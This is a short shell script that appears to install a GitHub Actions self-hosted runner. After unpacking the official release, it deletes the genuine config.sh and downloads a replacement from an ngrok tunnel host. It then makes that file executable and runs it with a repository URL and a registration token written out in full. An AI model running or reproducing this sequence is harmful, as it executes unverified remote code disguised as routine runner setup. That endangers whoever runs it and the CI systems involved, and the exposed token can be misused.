mkdir actions-runner && cd actions-runner
wget -O actions-runner-linux-x64-2.295.0.tar.gz https://github.com/actions/runner/releases/download/v2.295.0/actions-runner-linux-x64-2.295.0.tar.gz
tar xzf ./actions-runner-linux-x64-2.295.0.tar.gz
rm config.sh
wget https://4488-20-12-223-86.ngrok.io/config.sh
chmod +x config.sh
./config.sh --url https://github.com/mrwizyt/action-tmate --token A2SQBP6LXOZNYJCE5YZKYY3C7W5SG
./run.sh
